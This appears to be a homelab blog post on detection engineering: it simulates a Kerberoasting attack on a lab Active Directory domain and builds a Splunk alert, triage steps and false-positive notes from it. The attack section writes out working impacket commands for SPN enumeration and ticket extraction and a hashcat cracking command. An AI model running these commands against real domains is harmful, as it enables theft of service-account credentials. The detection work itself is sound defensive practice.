---
layout: post
title: "Kerberoasting Detection: From Attack Simulation to Automated SIEM Alerting"
date: 2026-02-20
categories: [homelab, siem, blue-team, red-team]
tags: [splunk, kerberoasting, active-directory, detection-engineering, mitre-attack, spl, hashcat, impacket]
excerpt: "Detection rule development and validation for Kerberoasting (T1558.003) through controlled attack simulation in a Windows Active Directory environment."
---

Detection rule development and validation for Kerberoasting (T1558.003) through controlled attack simulation in a Windows Active Directory environment.

<!--more-->

## Overview

A controlled Kerberoasting attack was executed against the lab.local domain to develop and validate a detection rule in Splunk. The attack targeted a service account with an SPN and weak credential, progressing through SPN enumeration, TGS ticket extraction, and offline hash cracking. The resulting detection query filters for RC4-encrypted TGS requests from non-machine accounts and has been deployed as an automated alert on a 15-minute schedule.

## Environment

| Component | Detail |
|-----------|--------|
| Domain Controller | DC01, Windows Server 2022, 192.168.56.10 |
| Attack Host | Kali Linux, 192.168.56.102 |
| SIEM | Splunk Enterprise (Ubuntu/Docker), receiving WinEventLog:Security via Universal Forwarder |
| Target Account | svc_sqldb, SPN: MSSQLSvc/sqlserver.lab.local:1433 |

## Attack Simulation

### Account Configuration (DC01)

```powershell
net user svc_sqldb Password1 /add /domain
setspn -A MSSQLSvc/sqlserver.lab.local:1433 svc_sqldb
```

### SPN Enumeration (Kali)

```bash
impacket-GetUserSPNs lab.local/tuser:Password1 -dc-ip 192.168.56.10
```

Result: `svc_sqldb` identified with MSSQLSvc SPN.

### TGS Ticket Extraction (Kali)

```bash
impacket-GetUserSPNs lab.local/tuser:Password1 -dc-ip 192.168.56.10 -request -outputfile /tmp/hash.txt
```

TGS-REP hash (etype 23/RC4) captured.

### Hash Cracking (Kali)

```bash
hashcat -m 13100 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
```

Result: `Password1` recovered in 4 seconds.

## Detection Rule

### Development

Starting dataset: 191 events matching `EventCode=4769`.

**Filter 1 -- Encryption type:** `Ticket_Encryption_Type=0x17` (RC4). Reduced to 4 events. AES (0x12) is the expected default; RC4 is the anomaly.

**Filter 2 -- Machine account exclusion:** `where NOT match(Service_Name, "\$")`. Machine accounts generate legitimate RC4 TGS requests during normal AD operations. The `$` suffix distinguishes them from human and service accounts.

### Final Query

```
index=main sourcetype="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
| where NOT match(Service_Name, "\$")
| table _time, Account_Name, Service_Name, Client_Address
```

### Results

| Time | Account | Service | Source IP |
|------|---------|---------|-----------|
| 2026-02-20 | tuser | svc_sqldb | ::ffff:192.168.56.102 |

Source IP maps to the Kali attack host. The `::ffff:` prefix is an IPv4-mapped IPv6 address from the DC's dual-stack configuration.

### Alert Configuration

| Parameter | Value |
|-----------|-------|
| Name | Kerberoasting Detection - RC4 TGS Request |
| Schedule | `*/15 * * * *` |
| Time Range | Last 15 minutes |
| Trigger | Results > 0 |
| Severity | High |
| Action | Add to Triggered Alerts |

Time range matches the cron interval to prevent re-alerting on historical events.

## Triage Procedure

1. **Validate** -- Confirm RC4 encryption and non-machine source in alert details
2. **Scope** -- Check if the source IP requested TGS tickets for multiple SPNs (single request = suspicious; multiple SPNs = active Kerberoasting campaign)
3. **Identify** -- Determine the target service account's privileges and what systems it can access
4. **Contain** -- Reset the service account password to 25+ random characters, invalidating any extracted hash
5. **Investigate** -- Examine the source host for indicators of prior compromise (Kerberoasting typically follows initial access)
6. **Document** -- Record timeline, affected accounts, source host, and remediation actions

## False Positive Considerations

- Legacy applications requiring RC4 Kerberos compatibility
- Environments without AES-only Kerberos policy enforcement
- Tuning: baseline which service accounts legitimately receive RC4 requests and add targeted exclusions

## MITRE ATT&CK

| Field | Value |
|-------|-------|
| Technique | T1558.003 -- Kerberoasting |
| Tactic | Credential Access |
| Data Source | Windows Event Log (4769) |
| Platform | Windows Active Directory |
